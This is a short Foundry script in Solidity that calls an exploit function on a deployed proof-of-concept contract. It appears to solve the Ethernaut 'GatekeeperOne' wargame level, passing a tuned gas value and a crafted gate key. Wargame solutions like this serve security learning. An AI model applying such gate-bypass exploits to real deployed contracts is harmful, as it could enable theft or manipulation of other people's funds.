// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Script} from "forge-std/Script.sol";
import "Ethernaut/gatekeeperone_poc.sol";
import "forge-std/console.sol";

contract GatekeeperOnePocScript is Script {
    GatekeeperOnePoc gatekeeperOnePoc;

    constructor() {   
      gatekeeperOnePoc = GatekeeperOnePoc(0x15fDBcea6Cf65171CF5e80A1C2694B37E89f9802);
    }

    function run() public {
      //0x63c34506f4f6280D42E7533Ae1d1d657ca4C6c3B

      uint256 deployerKey = vm.envUint("PRIVATE_KEY");
      vm.startBroadcast(deployerKey);
      // console.log("tx origin", tx.origin);
      console.log("msg.sender", msg.sender);

      try  gatekeeperOnePoc.exploit{gas: 30311}(bytes8(0x00000001_00001f38)) {
        console.log("exploit success");
      } catch Error(string memory reason) {
          console.log("exploit failed", reason);
      } catch (bytes memory reason) {
          // catch failing assert()
          console.log("exploit failed", string(reason));
      }

      vm.stopBroadcast();
    }
} 